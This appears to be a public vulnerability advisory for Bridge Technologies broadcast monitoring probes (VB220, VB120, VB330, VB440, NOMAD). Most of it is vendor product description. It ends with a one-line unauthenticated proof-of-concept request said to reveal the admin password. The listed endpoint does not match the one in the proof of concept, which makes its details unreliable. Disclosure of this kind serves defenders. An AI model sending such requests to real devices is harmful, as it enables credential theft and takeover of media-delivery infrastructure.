# bridgetech probes (VB220 IP Network Probe,VB120 Embedded IP + RF Probe,VB330 High-Capacity Probe, VB440 ST 2110 Production Analytics Probe , NOMAD) Information Disclosure Vulnerability

## Too lazy to write details, so here’s the description of the device from the vendor’s website
---
## Description
The Bridge probes offered in the Probe are VB220 IP Network Probe,VB120 Embedded IP + RF Probe,VB330 High-Capacity Probe, VB440 ST 2110 Production Analytics Probe , NOMA.

Bridge Technologies probes are high-end monitoring and analytics appliances engineered for broadcast, telecom, and media delivery environments. They inspect IP streams, RF links, and compressed/uncompressed media flows, assessing data integrity, transport quality, and user experience. These probes deliver deep visibility into every segment of content delivery, from source to end-user.

Centralized server software allowing unified monitoring of all deployed probes. Offers alarm aggregation, trend analysis (via microTimeline™), dashboards, Visio map integration, configuration management, user access control, reporting, and scaling from small to large deployments

Bridge Technologies is a Norwegian company based in Oslo that specializes in advanced monitoring, analysis, and quality assurance systems for digital media and telecommunications. Their solutions ensure high service quality across broadcast, cable, satellite, OTT, IPTV, and home networks, safeguarding content delivery for over 1.2 billion subscribers and thousands of channels worldwide
## Who Uses These Devices?

These solutions are primarily used by:

Broadcast and media companies (TV stations) operating studios,professional streamers, head-ends, and remote production environments.

Telecom, cable, satellite, and OTT providers ensuring service quality across networks.

Network engineers and QA teams needing real-time and historic insight into media delivery.

Remote production and field engineers deploying NOMAD in dynamic environments.

Large-scale operations managing many probes centrally via the VBC server.

---

## Vendor Information
- **Vendor:** bridgetech
- **Vendor Homepage:** [https://bridgetech.tv/](https://bridgetech.tv/)

---

## Affected Products
- **Product:** bridgetech probes (VB220 IP Network Probe,VB120 Embedded IP + RF Probe,VB330 High-Capacity Probe, VB440 ST 2110 Production Analytics Probe , NOMAD)


- **Built Version:** Jul 1 2025 12:43:42
- **Firmware Version:**  6.5.0-9  

---

## Vulnerable Endpoints
- `/vbc/data/rdplist`  


---

## Attack Type
- **Type:** Information Disclosure  
- **Classification:** Improper Authorization  

---

## Impact
**Severity:** High  
---
## Attack Vector
- **Access Method:** Remote, over HTTP  
- **Authentication Requirement:** None (unauthenticated)  
- **Exploit Complexity:** Low (simple HTTP requests)  

---

## Proof of Concept (PoC)
make a get requste for his endpoints

{target}/probe/core/setup/passwd?Change=1&=&passwd2=slvisolp&submitflash=OK&secs=1756630638395

this will show you the admin password


---

## PoC Video

https://github.com/user-attachments/assets/e37cb90b-4faa-4cbd-a6ee-befe77a9a664
